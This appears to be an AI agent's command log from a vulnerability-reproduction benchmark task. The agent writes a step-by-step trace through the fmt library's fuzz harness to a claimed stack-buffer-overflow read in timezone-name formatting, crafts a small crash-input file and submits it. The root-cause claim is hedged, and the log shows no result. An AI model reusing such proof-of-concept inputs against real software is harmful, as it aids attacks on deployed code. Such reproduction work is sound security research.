message:
Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('candidate_trace.json')
trace=[
  {"step":1,"file":"test/fuzzing/main.cc","function":"main","line":10,"var":"argv[i]","code":"std::ifstream in(argv[i]);","note":"The candidate PoC file path is opened and its bytes become the fuzz input."},
  {"step":2,"file":"test/fuzzing/main.cc","function":"main","line":16,"var":"buf","code":"std::vector<char> buf(static_cast<size_t>(size));","note":"The entire file is read into a byte buffer without transformation."},
  {"step":3,"file":"test/fuzzing/main.cc","function":"main","line":18,"var":"buf.data()","code":"LLVMFuzzerTestOneInput(as_bytes(buf.data()), buf.size());","note":"The raw file bytes are passed directly to the fuzz target entry point."},
  {"step":4,"file":"test/fuzzing/one-arg.cc","function":"LLVMFuzzerTestOneInput","line":38,"var":"first","code":"const auto first = data[0];","note":"The first byte selects the concrete argument type used for formatting."},
  {"step":5,"file":"test/fuzzing/one-arg.cc","function":"LLVMFuzzerTestOneInput","line":41,"var":"invoke_fmt<std::tm, std::time_t>","code":"case 13: invoke_fmt<std::tm, std::time_t>(data, size);","note":"Choosing byte value 13 routes execution to the time_t-to-tm path that uses std::localtime."},
  {"step":6,"file":"test/fuzzing/one-arg.cc","function":"invoke_fmt","line":22,"var":"repr","code":"auto repr = assign_from_buf<Repr>(data);","note":"The next 16 bytes are copied into a time_t representation that controls the calendar time value."},
  {"step":7,"file":"test/fuzzing/one-arg.cc","function":"from_repr<std::tm>","line":15,"var":"t","code":"return std::localtime(&t);","note":"The attacker-controlled time_t is converted to a tm pointer via the C library localtime routine."},
  {"step":8,"file":"include/fmt/chrono.h","function":"localtime","line":475,"var":"tm","code":"std::tm* tm = std::localtime(&time_);","note":"fmt::localtime falls back to std::localtime and copies the returned tm into a stack object."},
  {"step":9,"file":"include/fmt/chrono.h","function":"formatter<std::tm, Char>::format","line":739,"var":"format spec 'Z'","code":"case 'Z': handler.on_tz_name();","note":"A timezone-name specifier routes formatting into the tm_writer timezone-name handler."},
  {"step":10,"file":"include/fmt/chrono.h","function":"tm_writer::format_tz_name_impl","line":1115,"var":"tm.tm_zone","code":"out_ = write_tm_str<Char>(out_, tm.tm_zone, loc_);","note":"Formatting a timezone name dereferences a tm field that may point to invalid or unterminated memory, producing the stack-buffer-overflow read."}
]
p.write_text('[\n' + ',\n'.join('  ' + __import__('json').dumps(x) for x in trace) + '\n]\n')
print(p.read_text())
PY
printf '\x0dAAAAAAAAAAAAAAAA%*s' 1 Z > /workspace/poc5.bin
bash submit.sh /workspace/poc5.bin /workspace/candidate_trace.json || true
